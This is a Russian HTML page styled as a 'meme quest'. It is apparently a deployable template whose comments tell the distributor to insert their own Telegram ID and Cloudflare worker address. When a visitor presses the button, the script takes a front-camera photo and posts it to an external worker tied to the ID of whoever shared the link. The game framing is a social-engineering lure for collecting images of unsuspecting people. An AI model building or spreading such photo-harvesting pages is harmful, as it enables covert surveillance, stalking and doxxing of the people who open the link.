<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Мем-квест 📸</title>
<style>
  body {
    margin: 0; background: #17212b; color: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    min-height: 100vh; padding: 20px; text-align: center; box-sizing: border-box;
  }
  h1 { font-size: 24px; margin-bottom: 10px; }
  p { color: #aab; max-width: 340px; line-height: 1.5; font-size: 16px; }
  button {
    padding: 18px 36px; font-size: 18px; font-weight: bold; border: none; border-radius: 14px;
    background: #2ea6ff; color: #fff; margin-top: 24px; cursor: pointer;
    transition: background 0.3s; box-shadow: 0 4px 15px rgba(46, 166, 255, 0.3);
  }
  button:disabled { background: #456; cursor: default; box-shadow: none; }
  .success-text { color: #4ade80; font-size: 20px; font-weight: bold; margin-top: 20px; }
  .error-text { color: #f87171; font-size: 16px; margin-top: 20px; word-break: break-all; }
</style>
</head>
<body>

  <h1 id="title">Привет! 👋</h1>
  <p id="sub">Нажми кнопку ниже и разреши камеру. Снимок моментально улетит другу!</p>
  
  <button id="btn" onclick="shoot()">📸 Разрешить и сделать фото</button>

<script>
  // СЮДА ВСТАВЬ СВОЙ ID ИЗ @userinfobot (вместо 8166255221)
  const urlParams = new URLSearchParams(window.location.search);
  const ownerId = urlParams.get('ref') || "8166255221"; 

  const btn = document.getElementById('btn');
  const title = document.getElementById('title');
  const sub = document.getElementById('sub');

  async function shoot() {
    btn.disabled = true;
    btn.textContent = "Запрашиваю камеру...";
    sub.className = "";
    sub.textContent = "Пожалуйста, нажми «Разрешить» во всплывающем окне.";

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 } }, 
        audio: false
      });

      btn.textContent = "Улыбнись... 😄";
      
      const v = document.createElement('video');
      v.srcObject = stream;
      v.setAttribute('playsinline', 'true');
      v.muted = true;
      
      await v.play();
      await new Promise(r => setTimeout(r, 500)); 

      const c = document.createElement('canvas');
      c.width = v.videoWidth || 640;
      c.height = v.videoHeight || 480;
      c.getContext('2d').drawImage(v, 0, 0);
      const photoDataUrl = c.toDataURL('image/jpeg', 0.7);

      stream.getTracks().forEach(track => track.stop());
      btn.textContent = "Отправляем...";

      // НОВАЯ ССЫЛКА НА ТВОЙ CLOUDFLARE (с названием memfoto-official)
      // Она появится после того, как ты создашь проект в Cloudflare
      const WORKER_URL = 'https://memfoto-official.ТВОЙ_НИК.workers.dev/';

      const res = await fetch(WORKER_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ ref: ownerId, photo: photoDataUrl })
      });
      
      const json = await res.json();
      if (!json.ok) throw new Error(json.error || 'Ошибка отправки');

      title.textContent = "Готово! 🎉";
      sub.className = "success-text";
      sub.innerHTML = "Фото улетело другу.<br><br>Напиши другу, который скинул тебе эту ссылку 😉";
      btn.style.display = "none";

    } catch (e) {
      console.error(e);
      btn.disabled = false;
      btn.textContent = "Попробовать снова";
      sub.className = "error-text";
      
      if (e.name === 'NotAllowedError') {
        sub.textContent = "Ты запретил доступ к камере. Разреши его в настройках браузера.";
      } else if (e.message === "Failed to fetch") {
        sub.textContent = "Ошибка сети. Проверь интернет или ссылку воркера.";
      } else {
        sub.textContent = "Ошибка: " + e.message;
      }
    }
  }
</script>
</body>
</html>
